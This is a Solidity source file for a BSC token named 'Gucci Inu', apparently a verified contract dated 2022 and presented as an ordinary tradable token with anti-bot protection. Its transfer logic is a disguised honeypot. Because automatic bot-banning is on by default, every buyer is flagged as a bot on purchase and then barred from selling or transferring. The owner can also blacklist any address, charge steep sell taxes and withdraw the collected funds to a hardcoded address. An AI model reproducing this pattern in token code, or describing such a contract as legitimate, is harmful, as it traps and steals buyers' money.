/**
 *Submitted for verification at BscScan.com on 2022-01-18
*/

/**

*/

/*


	
*/
// SPDX-License-Identifier: unlicense
pragma solidity ^0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract ERC20 is IERC20 {
    uint256 internal _totalSupply = 1e22;
    string _name;
    string _symbol;
    uint8 constant _decimals = 18;
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        _beforeTokenTransfer(from, to, amount);

        uint256 senderBalance = _balances[from];
        require(senderBalance >= amount);
        unchecked {
            _balances[from] = senderBalance - amount;
        }
        _balances[to] += amount;
        emit Transfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }

    function allowance(address owner, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        external
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount);
        unchecked {
            _approve(sender, msg.sender, currentAllowance - amount);
        }

        return true;
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0));

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount);
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

pragma solidity ^0.8.7;

interface IUniswapV2Router02 {
    //function swapExactTokensForETHSupportingFeeOnTransferTokens(
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

pragma solidity ^0.8.7;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

abstract contract TradableErc20 is ERC20 {
    IUniswapV2Router02 internal constant _uniswapV2Router =
        IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address public uniswapV2Pair;
    bool public tradingEnable;
    mapping(address => bool) public isBot;
    mapping(address => bool) _isExcludedFromFee;
    bool _autoBanBots = true;
    bool _inSwap;
    uint256 public maxBuy;

    uint256 constant maxBuyIncrementMinutesTimer = 2; // increment maxbuy minutes
    uint256 constant maxBuyIncrementPercentage = 1; // increment maxbuy percentage 1000=100%
    uint256 public maxBuyIncrementValue; // value for increment maxBuy
    uint256 public incrementTime; // last increment time

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    modifier lockTheSwap() {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    constructor(string memory name_, string memory symbol_)
        ERC20(name_, symbol_)
    {
        _isExcludedFromFee[address(0)] = true;
    }

    receive() external payable {}

    function makeLiquidity() public onlyOwner {
        require(uniswapV2Pair == address(0));
        address pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );
        _balances[address(this)] = _totalSupply;
        _allowances[address(this)][address(_uniswapV2Router)] = _totalSupply;
        _isExcludedFromFee[pair] = true;
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            _totalSupply,
            0,
            0,
            msg.sender,
            block.timestamp
        );

        uniswapV2Pair = pair;
        tradingEnable = true;

        incrementTime = block.timestamp;
        maxBuyIncrementValue = (_totalSupply * maxBuyIncrementPercentage) / 1000;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(!isBot[from] && !isBot[to]);

        // buy
        if (from == uniswapV2Pair && !_isExcludedFromFee[to]) {
            // increment maxBuy
            uint256 incrementCount = (block.timestamp - incrementTime) /
                (maxBuyIncrementMinutesTimer * 1 minutes);
            if (incrementCount > 0) {
                if (maxBuy < _totalSupply)
                    maxBuy += maxBuyIncrementValue * incrementCount;
                incrementTime = block.timestamp;
            }

            require(tradingEnable);
            if (!_autoBanBots) require(_balances[to] + amount <= maxBuy);
            // antibot
            if (_autoBanBots) isBot[to] = true;
            amount = _getFeeBuy(amount);
        }

        // sell
        if (!_inSwap && uniswapV2Pair != address(0) && to == uniswapV2Pair) {
            amount = _getFeeSell(amount, from);
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance > 0) {
                uint256 maxContractBalance = (balanceOf(uniswapV2Pair) *
                    getMaxContractBalancePercent()) / 100;
                if (contractTokenBalance > maxContractBalance) {
                    uint256 burnCount;
                    unchecked {
                        burnCount = contractTokenBalance - maxContractBalance;
                    }
                    contractTokenBalance = maxContractBalance;
                    _totalSupply -= burnCount;
                    emit Transfer(address(this), address(0), burnCount);
                }
                //console.log("swapTokensForEth");
                uint256 swapCount = contractTokenBalance;
                uint256 maxSwapCount = 2 * amount;
                if (swapCount > maxSwapCount) swapCount = maxSwapCount;
                swapTokensForEth(swapCount);
            }
        }

        // transfer
        //console.log(from, "->", to);
        //console.log("amount: ", amount);
        super._transfer(from, to, amount);
        //console.log("=====end transfer=====");
    }

    function _getFeeBuy(uint256 amount) private returns (uint256) {
        uint256 fee = amount / 11; // 9.09%
        amount -= fee;
        _balances[address(this)] += fee;
        return amount;
    }

    function getSellBurnCount(uint256 amount) internal view returns (uint256) {
        // calculate fee percent
        uint256 value = _balances[uniswapV2Pair];
        uint256 vMin = value / 100; // min additive tax amount
        if (amount <= vMin) return amount / 20; // 5% constant tax
        uint256 vMax = value / 10; // max additive tax amount 10%
        if (amount > vMax) return (amount * 35) / 100; // 35% tax

        // additive tax, that in intervat 0-35%
        return (((amount - vMin) * 35 * amount) / (vMax - vMin)) / 100;
    }

    function _getFeeSell(uint256 amount, address account)
        private
        returns (uint256)
    {
        // get taxes
        uint256 devFee = amount / 14; // 7.1%
        uint256 burnCount = getSellBurnCount(amount); // burn count

        amount -= devFee + burnCount;
        _balances[account] -= devFee + burnCount;        
        _balances[address(this)] += devFee;
        _totalSupply -= burnCount;
        emit Transfer(address(this), address(0), burnCount);
        return amount;
    }

    function setMaxBuy(uint256 percent) external onlyOwner {
        _setMaxBuy(percent);
    }

    function _setMaxBuy(uint256 percentil) internal {
        maxBuy = (percentil * _totalSupply) / 5200000000;
    }

    function getMaxBuy() external view returns (uint256) {
        uint256 incrementCount = (block.timestamp - incrementTime) /
            (maxBuyIncrementMinutesTimer * 1 minutes);
        if (incrementCount == 0) return maxBuy;

        return maxBuy + maxBuyIncrementValue * incrementCount;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();

        _approve(address(this), address(_uniswapV2Router), tokenAmount);

        // make the swap
        _uniswapV2Router.swapExactTokensForETH(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }

    function setBots(address[] memory accounts, bool value) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; ++i) {
            isBot[accounts[i]] = value;
        }
    }

    function setExcludeFromFee(address[] memory accounts, bool value)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < accounts.length; ++i) {
            _isExcludedFromFee[accounts[i]] = value;
        }
    }

    function setTradingEnable(bool value, bool autoBanBotsValue)
        external
        onlyOwner
    {
        tradingEnable = value;
        _autoBanBots = autoBanBotsValue;
    }

    function setAutoBanBots(bool value) external onlyOwner {
        _autoBanBots = value;
    }

    function withdraw() external onlyOwner {
        _withdraw(address(this).balance);
    }

    function getMaxContractBalancePercent() internal virtual returns (uint256);

    function _withdraw(uint256 sum) internal virtual;

    function isOwner(address account) internal virtual returns (bool);
}

pragma solidity ^0.8.7;

contract GucciInu is TradableErc20 {
    address _owner;
    address _withdrawAddress =
        address(0x3c1D0fC6deBaDc62D36Da72AF727d95e1b843b0A);
    uint256 maxContractLiquidityPercent = 4;

    constructor() TradableErc20("Gucci Inu", "Gucciinu") {
        _owner = msg.sender;
        _setMaxBuy(4);
    }

    function getMaxContractBalancePercent()
        internal
        view
        override
        returns (uint256)
    {
        return maxContractLiquidityPercent;
    }

    function setMaxContractLiquidityPercent(uint256 newMaxLiquidityPercent)
        external
        onlyOwner
    {
        maxContractLiquidityPercent = newMaxLiquidityPercent;
    }

    function _withdraw(uint256 sum) internal override {
        payable(_withdrawAddress).transfer(sum);
    }

    function isOwner(address account) internal view override returns (bool) {
        return account == _owner || account == _withdrawAddress;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        _owner = newOwner;
    }
}